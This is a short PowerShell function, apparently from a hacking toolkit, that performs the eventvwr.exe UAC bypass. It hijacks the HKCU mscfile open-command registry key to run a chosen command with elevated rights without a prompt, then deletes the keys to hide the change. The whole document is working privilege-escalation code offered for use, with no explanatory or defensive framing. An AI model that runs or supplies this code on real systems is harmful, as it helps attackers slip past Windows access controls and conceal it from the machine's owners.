function BypassUAC-HackPlayers-Eventvwr {
param ([string]$comando)
$comando = "c:\Windows\System32\WindowsPowerShell\v1.0\" + $comando
New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command -force | out-null
$key = "registry::HKEY_CURRENT_USER\SOFTWARE\Classes\mscfile\shell\open\command" 
New-ItemProperty -Path $key -name '(Default)' -Value $comando -PropertyType string -Force | Out-Null
Start-Process eventvwr.exe ; sleep -Seconds 3
New-ItemProperty -Path $key -name '(Default)' -Value "" -PropertyType string -Force | Out-Null
Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command ; Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\ ; Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell ; Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile 
}

